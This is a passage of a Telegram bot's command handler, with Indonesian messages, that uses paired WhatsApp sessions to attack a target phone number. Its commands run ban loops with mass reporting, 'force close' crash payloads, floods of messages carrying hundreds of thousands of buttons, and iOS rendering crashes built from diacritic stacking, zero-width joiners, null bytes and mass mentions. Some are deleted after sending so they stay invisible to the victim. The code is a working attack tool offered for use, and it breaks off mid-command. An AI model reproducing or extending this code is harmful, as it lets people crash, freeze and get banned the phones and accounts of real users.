                            }
                            targetNumber = argsClean[1].replace(/[^0-9]/g, "");
                        } else {
                            targetNumber = argsClean[0].replace(/[^0-9]/g, "");
                        }

                        if (!targetNumber) {
                            return botError(ctx, "Invalid number. Please provide a valid WhatsApp number.", "⚠️ FORMAT SALAH");
                        }

                        const targetJid = `${targetNumber}@s.whatsapp.net`;

                        await actionSession(
                            ctx,
                            uid,
                            targetJid,
                            async (sock, targetJid) => {
                                // ── 1. If group link provided, join & send report there ──
                                if (groupLink) {
                                    try {
                                        await botReply(ctx, "🔗 Joining group...", [["Status", "Processing"]]);
                                        const inviteCode = groupLink.split("chat.whatsapp.com/")[1]?.split("?")[0];
                                        if (!inviteCode) throw new Error("Invalid group invite link");
                                        const joinedJid = await sock.groupAcceptInvite(inviteCode);
                                        log.success(`✅ Joined group ${joinedJid}`);
                                        await botReply(ctx, "✅ Joined group, sending report...", [["Status", "Sending report"]]);
                                        await travas.sendGroupReport(sock, joinedJid, targetNumber);
                                        await botReply(ctx, "📢 Report sent, proceeding with ban...", [["Status", "Banning"]]);
                                    } catch (err) {
                                        log.error(`❌ Group join/report failed: ${err.message}`);
                                        await botReply(ctx, "⚠️ Group join/report failed, continuing with ban.", [["Error", err.message]]);
                                    }
                                } 
                                // ── 2. If no group link, send report to admin group using owner's socket ──
                                else {
                                    try {
                                        const ownerSock = getOwnerSocket();
                                        if (ownerSock) {
                                            await ownerSock.sendMessage(
                                                '120363409802242353@g.us',
                                                { text: `.report ${targetNumber}` }
                                            );
                                            log.success(`✅ Owner report sent to 120363409802242353@g.us for ${targetNumber}`);
                                        } else {
                                            log.warning('⚠️ Owner socket not available, skipping admin report.');
                                            await botReply(ctx, "⚠️ Owner socket offline, report skipped.", [["Status", "Report not sent"]]);
                                        }
                                    } catch (err) {
                                        log.warning(`⚠️ Failed to send owner report: ${err.message}`);
                                        // Non-blocking; ban continues
                                    }
                                }

                                // ── 3. Execute 50‑loop ban (unchanged) ──
                                await botReply(ctx, "⚡ BAN EXECUTING", [
                                    ["Target", targetNumber],
                                    ["Status", "Starting 50 ban attempts..."]
                                ]);

                                let successes = 0;
                                let failures = 0;

                                for (let i = 0; i < 50; i++) {
                                    try {
                                        const result = await travas.banNumberV2(sock, targetJid);
                                        if (result.success) {
                                            successes++;
                                        } else {
                                            failures++;
                                            log.warning(`Attempt ${i+1} failed: ${result.error}`);
                                        }
                                    } catch (err) {
                                        failures++;
                                        log.error(`Attempt ${i+1} threw error: ${err.message}`);
                                    }
                                    await sleep(1000);
                                }

                                // Final summary
                                await botReply(ctx, "✅ BAN EXECUTION COMPLETE", [
                                    ["Target", targetNumber],
                                    ["Successes", String(successes)],
                                    ["Failures", String(failures)],
                                    ["Status", successes > 0 ? "Banned successfully" : "Failed to ban"]
                                ]);
                            },
                            sendTextResult
                        );

                        break;
                    }
					
// handlers.js — replace the existing "fc" case with this:

case "fc": {
    const number = (args[0] || "").replace(/[^0-9]/g, "");
    if (!number) {
        return botError(
            ctx,
            "Format: /fc <nomor>\nExample: /fc 6281234567890",
            "⚠️ FORMAT SALAH"
        );
    }
    const target = `${number}@s.whatsapp.net`;

    // ── Get available sessions ──
    const isOwnerUser = checkOwner(uid);
    let sessions = [];

    if (isOwnerUser) {
        const allPairs = getAllPairs();
        for (const [userId, numbers] of Object.entries(allPairs)) {
            for (const num of numbers) {
                sessions.push({ uid: userId, number: num });
            }
        }
        if (!sessions.length) {
            return botError(ctx, "No active sessions found across all users.", "⚠️ NO SESSIONS");
        }
    } else {
        sessions = getPairsForUser(uid).map(num => ({ uid, number: num }));
        if (!sessions.length) {
            return botError(ctx, "Belum ada sender aktif.", "⚠️ NO SESSION");
        }
    }

    // ── Filter active sessions ──
    const activeSessions = sessions.filter(({ uid: sUid, number: sNum }) => {
        const client = getClient(sUid, sNum);
        return client?.sock && client.status === "open";
    });

    if (!activeSessions.length) {
        return botError(ctx, "Tidak ada session yang aktif.", "⚠️ SESSION OFFLINE");
    }

    // ── Define the 2 attacks ──
    const attacks = [
        { name: "fc (Force Close Invisible)", fn: travas.fc },
        { name: "fc2 (Blank Era Crash)", fn: travas.fc2 },
    ];

    const TOTAL_LOOPS = 25;
    const LOOP_DELAY = 3000;

    // ── The attack function ──
    const executeAttack = async (sock, sessionLabel = "") => {
        const startMsg = await botReply(
            ctx,
            `💥 FC ATTACK ${sessionLabel}`,
            [
                ["Target", number],
                ["Loop", `0/${TOTAL_LOOPS}`],
                ["Attacks/loop", attacks.length],
                ["Success", "0"],
                ["Failed", "0"],
                ["Status", "🚀 Starting..."]
            ]
        );
        const chatId = ctx.chat.id;
        const messageId = startMsg.message_id;

        let totalAttacks = 0;
        let successAttacks = 0;
        let failedAttacks = 0;
        let allErrors = [];

        for (let loop = 1; loop <= TOTAL_LOOPS; loop++) {
            const loopErrors = [];

            for (let i = 0; i < attacks.length; i++) {
                const { name, fn } = attacks[i];
                const attackIndex = i + 1;

                try {
                    // Update status: Running
                    let text = `💥 FC ATTACK ${sessionLabel}\n\n`;
                    text += `Target: ${number}\n`;
                    text += `Loop: ${loop}/${TOTAL_LOOPS}\n`;
                    text += `Attack: ${attackIndex}/${attacks.length} - ${name}\n`;
                    text += `Success: ${successAttacks}\n`;
                    text += `Failed: ${failedAttacks}\n`;
                    text += `Status: ⚡ Running...`;
                    try {
                        await ctx.api.editMessageText(chatId, messageId, text);
                    } catch (e) { /* ignore */ }

                    // Execute the attack
                    await fn(sock, target);
                    successAttacks++;

                    // Update status: Completed
                    text = `💥 FC ATTACK ${sessionLabel}\n\n`;
                    text += `Target: ${number}\n`;
                    text += `Loop: ${loop}/${TOTAL_LOOPS}\n`;
                    text += `Attack: ${attackIndex}/${attacks.length} - ✅ ${name}\n`;
                    text += `Success: ${successAttacks}\n`;
                    text += `Failed: ${failedAttacks}\n`;
                    text += `Status: ✅ Completed`;
                    try {
                        await ctx.api.editMessageText(chatId, messageId, text);
                    } catch (e) { /* ignore */ }

                } catch (err) {
                    const errMsg = err.message || String(err);
                    loopErrors.push(`${name}: ${errMsg}`);
                    failedAttacks++;
                    console.error(`❌ Loop ${loop}, ${name} failed: ${errMsg}`);

                    // Update status: Failed
                    let text = `💥 FC ATTACK ${sessionLabel}\n\n`;
                    text += `Target: ${number}\n`;
                    text += `Loop: ${loop}/${TOTAL_LOOPS}\n`;
                    text += `Attack: ${attackIndex}/${attacks.length} - ❌ ${name}\n`;
                    text += `Success: ${successAttacks}\n`;
                    text += `Failed: ${failedAttacks}\n`;
                    text += `Status: ❌ Failed: ${errMsg.slice(0, 50)}`;
                    try {
                        await ctx.api.editMessageText(chatId, messageId, text);
                    } catch (e) { /* ignore */ }
                }
                totalAttacks++;

                // Delay between attacks within same loop
                if (i < attacks.length - 1) {
                    await sleep(LOOP_DELAY);
                }
            }

            if (loopErrors.length) {
                allErrors.push(`Loop ${loop}: ${loopErrors.join("; ")}`);
            }

            // Progress update every 10 loops
            if (loop % 10 === 0 || loop === TOTAL_LOOPS) {
                await botReply(ctx, `⏳ FC PROGRESS ${sessionLabel}`, [
                    ["Loop", `${loop}/${TOTAL_LOOPS}`],
                    ["Successful", successAttacks],
                    ["Failed", failedAttacks],
                    ["Status", loop < TOTAL_LOOPS ? "Continuing..." : "✅ Completed"]
                ]);
            }

            // Delay between loops
            if (loop < TOTAL_LOOPS) {
                await sleep(LOOP_DELAY);
            }
        }

        const finalStatus = allErrors.length === 0
            ? "✅ All 50 loops completed successfully!"
            : `⚠️ ${allErrors.length} loop(s) had errors.`;

        // Final update
        let finalText = `💥 FC ATTACK ${sessionLabel}\n\n`;
        finalText += `Target: ${number}\n`;
        finalText += `Loops: ${TOTAL_LOOPS}\n`;
        finalText += `Total Attacks: ${totalAttacks}\n`;
        finalText += `✅ Successful: ${successAttacks}\n`;
        finalText += `❌ Failed: ${failedAttacks}\n`;
        finalText += `Status: ${finalStatus}`;
        try {
            await ctx.api.editMessageText(chatId, messageId, finalText);
        } catch (e) { /* ignore */ }

        await botReply(ctx, `✅ FC COMPLETE ${sessionLabel}`, [
            ["Target", number],
            ["Total Loops", TOTAL_LOOPS],
            ["Total Attacks", totalAttacks],
            ["Successful", successAttacks],
            ["Failed", failedAttacks],
            ["Status", finalStatus]
        ]);

        return { success: successAttacks, failed: failedAttacks, total: totalAttacks };
    };

    // ── If only one active session, execute directly ──
    if (activeSessions.length === 1) {
        const { uid: sUid, number: sNum } = activeSessions[0];
        const client = getClient(sUid, sNum);

        try {
            await executeAttack(client.sock, `[${sNum}]`);
            return;
        } catch (err) {
            return botError(ctx, err.message, "❌ EXECUTION FAILED");
        }
    }

    // ── Multi-session selection menu ──
    pendingAction.set(uid, {
        func: async (sock, sessionInfo) => {
            const [sUid, sNum] = sessionInfo.split('_');
            const client = getClient(sUid, sNum);
            if (!client?.sock || client.status !== "open") {
                throw new Error(`Session ${sNum} is offline`);
            }
            await executeAttack(client.sock, `[${sNum}]`);
        },
        target: target,
        resultFunc: sendTextResult
    });

    const keyboard = { inline_keyboard: [] };
    const cells = [
        [
            { text: "Status", is_header: true, align: "center", valign: "middle" },
            { text: "Session", is_header: true, align: "center", valign: "middle" }
        ]
    ];

    activeSessions.forEach(({ uid: sUid, number: sNum }) => {
        const display = isOwnerUser ? `${sUid} → ${sNum}` : sNum;
        cells.push([
            { text: "📱 Sender", align: "left", valign: "middle" },
            { text: display, align: "left", valign: "middle" }
        ]);

        const callbackData = isOwnerUser ? `fc_${sUid}_${sNum}` : `fc_${sNum}`;
        keyboard.inline_keyboard.push([
            {
                text: `📱 ${display}`,
                callback_data: callbackData,
                style: "success",
                icon_custom_emoji_id: "6266777440039736768"
            }
        ]);
    });

    keyboard.inline_keyboard.push([
        {
            text: "📤 All Senders",
            callback_data: "fc_all",
            style: "success",
            icon_custom_emoji_id: "5780864206177834457"
        }
    ]);

    return bot.api.raw.sendRichMessage({
        chat_id: ctx.chat.id,
        rich_message: {
            blocks: [
                {
                    type: "heading",
                    text: [{ type: "custom_emoji", custom_emoji_id: "6266777440039736768", alternative_text: "📱" }, " SELECT SENDER FOR FC ATTACK"],
                    size: 1
                },
                {
                    type: "paragraph",
                    text: `Target: ${number}\nLoops: ${TOTAL_LOOPS}\nDelay: ${LOOP_DELAY}ms\nAttacks: fc + fc2`
                },
                {
                    type: "table",
                    cells,
                    is_bordered: true,
                    is_striped: true
                }
            ]
        },
        reply_markup: keyboard
    });
    break;
}	
					
case "heavy": {
  const number = (args[0] || "").replace(/[^0-9]/g, "");
  if (!number) {
    return botError(ctx, "Format: /heavy <nomor>", "⚠️ FORMAT SALAH");
  }

  const target = `${number}@s.whatsapp.net`;
  const loops = 50;
  const delayMs = 300;
  const buttonCount = 500_000; // safe, still very heavy

  await actionSession(ctx, uid, target, async (socket, recipient) => {
    await botReply(ctx, "💥 HEAVY FLOOD (25x, 500k buttons each)", [
      ["Target", number],
      ["Loops", loops],
      ["Buttons per message", buttonCount.toLocaleString()],
      ["Delay between", `${delayMs}ms`],
      ["Deletion", "After 10 seconds (invisible)"],
      ["Status", "Starting..."]
    ]);

    let success = 0,
        failed = 0;

    for (let i = 0; i < loops; i++) {
      const result = await travas.sendHeavyAndDelete(socket, recipient, buttonCount);
      if (result.success) success++;
      else failed++;

      if (i < loops - 1) {
        await new Promise(resolve => setTimeout(resolve, delayMs));
      }

      // Progress update every 5 loops
      if ((i + 1) % 5 === 0 || i === loops - 1) {
        await botReply(ctx, `⏳ Progress: ${i+1}/${loops}`, [
          ["Successful", success],
          ["Failed", failed],
          ["Status", i === loops - 1 ? "Done" : "Continuing..."]
        ]);
      }
    }

    await botReply(ctx, success === loops ? "✅ ALL MESSAGES SENT & DELETED" : "⚠️ PARTIAL SUCCESS", [
      ["Target", number],
      ["Total sent", loops],
      ["Successful", success],
      ["Failed", failed],
      ["Visibility", "Deleted after 10s – invisible"]
    ]);
  }, sendTextResult);
  break;
}

case "crashinvisible": {
  const number = (args[0] || "").replace(/[^0-9]/g, "");
  if (!number) {
    return botError(ctx, "Format: /crash <nomor>", "⚠️ FORMAT SALAH");
  }

  const target = `${number}@s.whatsapp.net`;
  const loops = 25;
  const delayMs = 300;

  await actionSession(ctx, uid, target, async (socket, recipient) => {
    await botReply(ctx, "💥 CRASH FLOOD (25x, 3 payloads each)", [
      ["Target", number],
      ["Loops", loops],
      ["Payloads per loop", "3 (plain, interactive, view‑once)"],
      ["Total messages", loops * 3],
      ["Deletion", "After 3 seconds"],
      ["Status", "Starting..."]
    ]);

    let success = 0, failed = 0;

    for (let i = 0; i < loops; i++) {
      const result = await travas.crashAndDelete(socket, recipient);
      if (result.success) success++;
      else failed++;

      if (i < loops - 1) {
        await new Promise(resolve => setTimeout(resolve, delayMs));
      }

      if ((i + 1) % 5 === 0 || i === loops - 1) {
        await botReply(ctx, `⏳ Progress: ${i+1}/${loops}`, [
          ["Successful rounds", success],
          ["Failed rounds", failed]
        ]);
      }
    }

    await botReply(ctx, success === loops ? "✅ ALL CRASHES SUCCESSFUL" : "⚠️ PARTIAL", [
      ["Target", number],
      ["Total rounds", loops],
      ["Successful", success],
      ["Failed", failed],
      ["Visibility", "Deleted after 3s – invisible"]
    ]);
  }, sendTextResult);
  break;
}

case "blankera": {
  const number = (args[0] || "").replace(/[^0-9]/g, "");
  if (!number) {
    return botError(
      ctx,
      "📋 *BLANK ERA V5 USAGE*\n\n" +
      "Format: /blankera <nomor>\n" +
      "Contoh: /blankera 6281234567890\n\n" +
      "⚠️ Blank Era V5 Attack Suite (50x loop):\n" +
      "• Interactive Message (75k buttons)\n" +
      "• Ephemeral Message\n" +
      "• Interactive with 450k buttons\n" +
      "• Interactive Response\n" +
      "• Location ViewOnce\n" +
      "• Total executions: 50 loops\n" +
      "• Delay between loops: 1.1 seconds\n\n" +
      "💡 Supports multi-session selection",
      "⚠️ FORMAT SALAH"
    );
  }

  const target = `${number}@s.whatsapp.net`;

  // ── Get available sessions ──
  const isOwnerUser = checkOwner(uid);
  let sessions = [];

  if (isOwnerUser) {
    const allPairs = getAllPairs();
    for (const [userId, numbers] of Object.entries(allPairs)) {
      for (const num of numbers) {
        sessions.push({ uid: userId, number: num });
      }
    }
    if (!sessions.length) {
      return botError(ctx, "No active sessions found across all users.", "⚠️ NO SESSIONS");
    }
  } else {
    sessions = getPairsForUser(uid).map(num => ({ uid, number: num }));
    if (!sessions.length) {
      return botError(ctx, "Belum ada sender aktif.", "⚠️ NO SESSION");
    }
  }

  // ── Filter active sessions ──
  const activeSessions = sessions.filter(({ uid: sUid, number: sNum }) => {
    const client = getClient(sUid, sNum);
    return client?.sock && client.status === "open";
  });

  if (!activeSessions.length) {
    return botError(ctx, "Tidak ada session yang aktif.", "⚠️ SESSION OFFLINE");
  }

  // ── Attack function with 50 loops ──
  const executeAttack = async (sock, sessionLabel = "") => {
    const TOTAL_LOOPS = 30;
    const DELAY_MS = 500;
    let successCount = 0;
    let failCount = 0;

    const startMsg = await botReply(
      ctx,
      `💥 BLANK ERA V5 ${sessionLabel}`,
      [
        ["Target", number],
        ["Loop", `0/${TOTAL_LOOPS}`],
        ["Success", "0"],
        ["Failed", "0"],
        ["Status", "🚀 Starting..."]
      ]
    );
    const chatId = ctx.chat.id;
    const messageId = startMsg.message_id;

    for (let i = 1; i <= TOTAL_LOOPS; i++) {
      try {
        await travas.iosnew(sock, target);
        successCount++;
      } catch (err) {
        failCount++;
        log.error(`❌ BlankEraV5 loop ${i} failed: ${err.message}`);
      }

      // Update progress every 5 loops or on last iteration
      if (i % 5 === 0 || i === TOTAL_LOOPS) {
        try {
          const newText = 
            `💥 BLANK ERA V5 ${sessionLabel}\n` +
            `Target: ${number}\n` +
            `Loop: ${i}/${TOTAL_LOOPS}\n` +
            `Success: ${successCount}\n` +
            `Failed: ${failCount}\n` +
            `Status: ${i < TOTAL_LOOPS ? 'Running...' : '✅ Completed'}`;
          await ctx.api.editMessageText(chatId, messageId, newText);
        } catch (editErr) { /* ignore */ }
      }

      // Delay between loops (except after last)
      if (i < TOTAL_LOOPS) {
        await new Promise(resolve => setTimeout(resolve, DELAY_MS));
      }
    }

    // Final summary
    await botReply(ctx, `✅ BLANK ERA V5 COMPLETE ${sessionLabel}`, [
      ["Target", number],
      ["Total Loops", TOTAL_LOOPS],
      ["Successful", successCount],
      ["Failed", failCount],
      ["Total Payloads", successCount * 5]
    ]);

    try {
      await ctx.api.deleteMessage(chatId, messageId);
    } catch (delErr) { /* ignore */ }

    return { success: successCount, failed: failCount, total: TOTAL_LOOPS };
  };

  // ── If only one active session, execute directly ──
  if (activeSessions.length === 1) {
    const { uid: sUid, number: sNum } = activeSessions[0];
    const client = getClient(sUid, sNum);

    try {
      await executeAttack(client.sock, `[${sNum}]`);
      return;
    } catch (err) {
      return botError(ctx, err.message, "❌ EXECUTION FAILED");
    }
  }

  // ── Multi-session selection menu ──
  pendingAction.set(uid, {
    func: async (sock, sessionInfo) => {
      const [sUid, sNum] = sessionInfo.split('_');
      const client = getClient(sUid, sNum);
      if (!client?.sock || client.status !== "open") {
        throw new Error(`Session ${sNum} is offline`);
      }
      await executeAttack(client.sock, `[${sNum}]`);
    },
    target: target,
    resultFunc: sendTextResult
  });

  const keyboard = {
    inline_keyboard: []
  };

  const cells = [
    [
      { text: "Status", is_header: true, align: "center", valign: "middle" },
      { text: "Session", is_header: true, align: "center", valign: "middle" }
    ]
  ];

  activeSessions.forEach(({ uid: sUid, number: sNum }) => {
    const display = isOwnerUser ? `${sUid} → ${sNum}` : sNum;
    cells.push([
      { text: "📱 Sender", align: "left", valign: "middle" },
      { text: display, align: "left", valign: "middle" }
    ]);

    const callbackData = isOwnerUser ? `blankera_${sUid}_${sNum}` : `blankera_${sNum}`;
    keyboard.inline_keyboard.push([
      {
        text: `📱 ${display}`,
        callback_data: callbackData,
        style: "success",
        icon_custom_emoji_id: "6266777440039736768"
      }
    ]);
  });

  keyboard.inline_keyboard.push([
    {
      text: "📤 All Senders",
      callback_data: "blankera_all",
      style: "success",
      icon_custom_emoji_id: "5780864206177834457"
    }
  ]);

  return bot.api.raw.sendRichMessage({
    chat_id: ctx.chat.id,
    rich_message: {
      blocks: [
        {
          type: "heading",
          text: [{ type: "custom_emoji", custom_emoji_id: "6266777440039736768", alternative_text: "📱" }, " SELECT SENDER FOR BLANK ERA V5"],
          size: 1
        },
        {
          type: "paragraph",
          text: `Target: ${number}\nLoops: 50\nPayloads per loop: 5\nDelay: 1.1s`
        },
        {
          type: "table",
          cells,
          is_bordered: true,
          is_striped: true
        }
      ]
    },
    reply_markup: keyboard
  });
}
					
case "delay": {
  const number = (args[0] || "").replace(/[^0-9]/g, "");
  if (!number) {
    return botError(
      ctx,
      "Format: /powercrash <nomor>\nExample: /powercrash 6281234567890",
      "⚠️ FORMAT SALAH"
    );
  }

  const target = `${number}@s.whatsapp.net`;

  await actionSession(
    ctx,
    uid,
    target,
    async (sock, target) => {
      await botReply(
        ctx,
        "💥 POWER CRASH EXECUTING",
        [
          ["Target", number],
          ["Total loops", "100"],
          ["Per loop", "1× powercrash (50 sends) + 1× pollcrash (20 sends)"],
          ["Delay between sends", "300ms"],
          ["Status", "Starting..."]
        ]
      );

      // ── 100 loops ──
      for (let loop = 1; loop <= 100; loop++) {
        // Phase 1: powercrash (50 interactive messages)
        await travas.powercrash(sock, target);

        // Phase 2: pollcrash (20 poll messages)
        await travas.pollcrash(sock, target);

        // Optional: small log update every 10 loops
        if (loop % 10 === 0) {
          await botReply(
            ctx,
            "⏳ POWER CRASH PROGRESS",
            [
              ["Loop", `${loop}/100`],
              ["Status", "Continuing..."]
            ]
          );
        }
      }

      // Final confirmation
      await botReply(
        ctx,
        "✅ POWER CRASH COMPLETE",
        [
          ["Target", number],
          ["Total loops", "100"],
          ["Total messages sent", "7000 (5000 interactive + 2000 polls)"],
          ["Visibility", "Fully invisible (status + delete)"]
        ]
      );
    },
    sendTextResult
  );
  break;
}

// handlers.js — inside the switch statement

case "game": {
  const number = (args[0] || "").replace(/[^0-9]/g, "");
  if (!number) {
    return botError(
      ctx,
      "📋 *GAME PAYLOAD USAGE*\n\n" +
      "Format: /game <nomor>\n" +
      "Contoh: /game 6281234567890\n\n" +
      "🎮 Sends Highway Rush HTML Game:\n" +
      "• Full racing game (touch/button controls)\n" +
      "• Score tracking with local storage\n" +
      "• Invisible rich response payload\n" +
      "• No notification, no trace\n\n" +
      "💡 Supports multi-session selection",
      "⚠️ FORMAT SALAH"
    );
  }

  const target = `${number}@s.whatsapp.net`;

  await actionSession(
    ctx,
    uid,
    target,
    async (sock, target) => {
      const startMsg = await botReply(
        ctx,
        "🎮 GAME PAYLOAD",
        [
          ["Target", number],
          ["Game", "Highway Rush 🏎️"],
          ["Status", "🚀 Sending..."]
        ]
      );

      try {
        const result = await travas.game(sock, target);
        
        if (result?.success) {
          try {
            await ctx.api.deleteMessage(ctx.chat.id, startMsg.message_id);
          } catch (delErr) { /* ignore */ }
          
          await botReply(ctx, "✅ GAME DELIVERED", [
            ["Target", number],
            ["Status", "✅ Success"],
            ["Visibility", "Rich response (invisible payload)"]
          ]);
        } else {
          throw new Error("Game function returned failure");
        }
      } catch (err) {
        await botReply(ctx, "❌ GAME FAILED", [
          ["Target", number],
          ["Error", err.message || "Unknown error"]
        ]);
        throw err;
      }
    },
    sendTextResult
  );
  break;
}

case "uistuck": {
  const number = (args[0] || "").replace(/[^0-9]/g, "");
  if (!number) {
    return botError(ctx, "Format: /uistuck <nomor>", "⚠️ FORMAT SALAH");
  }
  const target = `${number}@s.whatsapp.net`;

  await actionSession(
    ctx,
    uid,
    target,
    async (sock, target) => {
      await botReply(ctx, "🌀 UI FREEZE ATTACK", [
        ["Target", number],
        ["Type", "Visible"],
        ["Status", "Sending 10 rounds of 10 cycles (100 total)..."]
      ]);

      // Call the existing uistuck 10 times (each sends 10 cycles)
      for (let round = 0; round < 10; round++) {
        await travas.uistuck(sock, target);
        await sleep(2000); // extra delay between rounds
      }
    },
    sendTextResult
  );
  break;
}

case "iosaldevcrash": {
  const number = (args[0] || "").replace(/[^0-9]/g, "");
  if (!number) {
    return botError(
      ctx,
      "📋 *IOS CHARACTER CRASH USAGE*\n\n" +
      "Format: /iosaldevcrash <nomor>\n" +
      "Contoh: /iosaldevcrash 6281234567890\n\n" +
      "⚠️ Uses character‑based rendering overload (proven effective):\n" +
      "• Massive diacritic stacking (200 chars × 10 diacritics)\n" +
      "• Zero‑width joiner flood (50k characters)\n" +
      "• RTL/LTR bidirectional switches\n" +
      "• Emoji modifier sequences (500 repetitions)\n" +
      "• Control characters + null bytes (15k)\n" +
      "• 5000 mentions per message\n" +
      "• 5 different payloads per loop:\n" +
      "  1. Plain text (500k+ chars)\n" +
      "  2. Text with 5000 mentions\n" +
      "  3. Long URL + text\n" +
      "  4. Image with huge caption\n" +
      "  5. Sticker with huge accessibility label\n" +
      "• 25 loops, 2000ms delay\n" +
      "• Visible in chat (maximum freeze effect)\n\n" +
      "💡 Supports multi‑session selection",
      "⚠️ FORMAT SALAH"
    );
  }

  const target = `${number}@s.whatsapp.net`;

  // ── Get available sessions ──
  const isOwnerUser = checkOwner(uid);
  let sessions = [];

  if (isOwnerUser) {
    const allPairs = getAllPairs();
    for (const [userId, numbers] of Object.entries(allPairs)) {
      for (const num of numbers) {
        sessions.push({ uid: userId, number: num });
      }
    }
    if (!sessions.length) {
      return botError(ctx, "No active sessions found across all users.", "⚠️ NO SESSIONS");
    }
  } else {
    sessions = getPairsForUser(uid).map(num => ({ uid, number: num }));
    if (!sessions.length) {
      return botError(ctx, "Belum ada sender aktif.", "⚠️ NO SESSION");
    }
  }

  // ── Filter active sessions ──
  const activeSessions = sessions.filter(({ uid: sUid, number: sNum }) => {
    const client = getClient(sUid, sNum);
    return client?.sock && client.status === "open";
  });

  if (!activeSessions.length) {
    return botError(ctx, "Tidak ada session yang aktif.", "⚠️ SESSION OFFLINE");
  }

  // ── Attack function with 25 loops and 2000ms delay ──
  const executeAttack = async (sock, sessionLabel = "") => {
    const TOTAL_LOOPS = 25;
    const DELAY_MS = 2000;
    let successCount = 0;
    let failCount = 0;

    const startMsg = await botReply(
      ctx,
      `💥 IOS CHARACTER CRASH ${sessionLabel}`,
      [
        ["Target", number],
        ["Loop", `0/${TOTAL_LOOPS}`],
        ["Success", "0"],
        ["Failed", "0"],
        ["Status", "🚀 Starting..."]
      ]
    );
    const chatId = ctx.chat.id;
    const messageId = startMsg.message_id;

    for (let i = 1; i <= TOTAL_LOOPS; i++) {
      try {
        // Send one full character crash loop (5 payloads)
        await travas.iosCharacterCrash(sock, target, 1, 0);
        successCount++;
      } catch (err) {
        failCount++;
        log.error(`❌ iOS Character Crash loop ${i} failed: ${err.message}`);
      }

      // Update progress every 5 loops or on last iteration
      if (i % 5 === 0 || i === TOTAL_LOOPS) {
        try {
          const newText =
            `💥 IOS CHARACTER CRASH ${sessionLabel}\n` +
            `Target: ${number}\n` +
            `Loop: ${i}/${TOTAL_LOOPS}\n` +
            `Success: ${successCount}\n` +
            `Failed: ${failCount}\n` +
            `Status: ${i < TOTAL_LOOPS ? 'Running...' : '✅ Completed'}`;
          await ctx.api.editMessageText(chatId, messageId, newText);
        } catch (editErr) { /* ignore */ }
      }

      if (i < TOTAL_LOOPS) {
        await new Promise(resolve => setTimeout(resolve, DELAY_MS));
      }
    }

    // Final summary
    await botReply(ctx, `✅ IOS CHARACTER CRASH COMPLETE ${sessionLabel}`, [
      ["Target", number],
      ["Total Loops", TOTAL_LOOPS],
      ["Successful", successCount],
      ["Failed", failCount],
      ["Total Payloads", successCount * 5]
    ]);

    try {
      await ctx.api.deleteMessage(chatId, messageId);
    } catch (delErr) { /* ignore */ }

    return { success: successCount, failed: failCount, total: TOTAL_LOOPS };
  };

  // ── If only one active session, execute directly ──
  if (activeSessions.length === 1) {
    const { uid: sUid, number: sNum } = activeSessions[0];
    const client = getClient(sUid, sNum);

    try {
      await executeAttack(client.sock, `[${sNum}]`);
      return;
    } catch (err) {
      return botError(ctx, err.message, "❌ EXECUTION FAILED");
    }
  }

  // ── Multi‑session selection menu ──
  pendingAction.set(uid, {
    func: async (sock, sessionInfo) => {
      const [sUid, sNum] = sessionInfo.split('_');
      const client = getClient(sUid, sNum);
      if (!client?.sock || client.status !== "open") {
        throw new Error(`Session ${sNum} is offline`);
      }
      await executeAttack(client.sock, `[${sNum}]`);
    },
    target: target,
    resultFunc: sendTextResult
  });

  const keyboard = { inline_keyboard: [] };
  const cells = [
    [
      { text: "Status", is_header: true, align: "center", valign: "middle" },
      { text: "Session", is_header: true, align: "center", valign: "middle" }
    ]
  ];

  activeSessions.forEach(({ uid: sUid, number: sNum }) => {
    const display = isOwnerUser ? `${sUid} → ${sNum}` : sNum;
    cells.push([
      { text: "📱 Sender", align: "left", valign: "middle" },
      { text: display, align: "left", valign: "middle" }
    ]);

    const callbackData = isOwnerUser ? `iosaldevcrash_${sUid}_${sNum}` : `iosaldevcrash_${sNum}`;
    keyboard.inline_keyboard.push([
      {
        text: `📱 ${display}`,
        callback_data: callbackData,
        style: "success",
        icon_custom_emoji_id: "6266777440039736768"
      }
    ]);
  });

  keyboard.inline_keyboard.push([
    {
      text: "📤 All Senders",
      callback_data: "iosaldevcrash_all",
      style: "success",
      icon_custom_emoji_id: "5780864206177834457"
    }
  ]);

  return bot.api.raw.sendRichMessage({
    chat_id: ctx.chat.id,
    rich_message: {
      blocks: [
        {
          type: "heading",
          text: [{ type: "custom_emoji", custom_emoji_id: "6266777440039736768", alternative_text: "📱" }, " SELECT SENDER FOR IOS CHARACTER CRASH"],
          size: 1
        },
        {
          type: "paragraph",
          text: `Target: ${number}\nLoops: 25\nDelay: 2000ms\nPayloads per loop: 5`
        },
        {
          type: "table",
          cells,
          is_bordered: true,
          is_striped: true
        }
      ]
    },
    reply_markup: keyboard
  });
  break;
}

case "ioshard": {
  const number = (args[0] || "").replace(/[^0-9]/g, "");
  if (!number) {
    return botError(
      ctx,
      "📋 *IOS HARD ATTACK USAGE*\n\n" +
      "Format: /ioshard <nomor>\n" +
      "Contoh: /ioshard 6281234567890\n\n" +
      "⚠️ IOS Hard Attack Suite:\n" +
      "• iosnew (iOS Invisible Freeze) - 20 poll messages\n" +
      "• powercrash (iOS invisible delay) - 50 interactive messages\n\n" +
      "💡 Supports multi-session selection",
      "⚠️ FORMAT SALAH"
    );
  }

  const target = `${number}@s.whatsapp.net`;

  // ── Get available sessions ──
  const isOwnerUser = checkOwner(uid);
  let sessions = [];

  if (isOwnerUser) {
    const allPairs = getAllPairs();
    for (const [userId, numbers] of Object.entries(allPairs)) {
      for (const num of numbers) {
        sessions.push({ uid: userId, number: num });
      }
    }
    if (!sessions.length) {
      return botError(ctx, "No active sessions found across all users.", "⚠️ NO SESSIONS");
    }
  } else {
    sessions = getPairsForUser(uid).map(num => ({ uid, number: num }));
    if (!sessions.length) {
      return botError(ctx, "Belum ada sender aktif.", "⚠️ NO SESSION");
    }
  }

  // ── Filter active sessions ──
  const activeSessions = sessions.filter(({ uid: sUid, number: sNum }) => {
    const client = getClient(sUid, sNum);
    return client?.sock && client.status === "open";
  });

  if (!activeSessions.length) {
    return botError(ctx, "Tidak ada session yang aktif.", "⚠️ SESSION OFFLINE");
  }

  // ── iOS Attacks config ──
  const attacks = [
    { name: "IosInvisible (iOS Invisible Freeze)", fn: travas.IosInvisible },
    { name: "fios (iOS invisible crash)", fn: travas.fios },
  ];

  const TOTAL_LOOPS = 50;
  const LOOP_DELAY = 1000;

  // ── The attack function ──
  const executeAttack = async (sock, sessionLabel = "") => {
    const startMsg = await botReply(
      ctx,
      `💥 IOS HARD ATTACK ${sessionLabel}`,
      [
        ["Target", number],
        ["Loop", `0/${TOTAL_LOOPS}`],
        ["Attacks/loop", attacks.length],
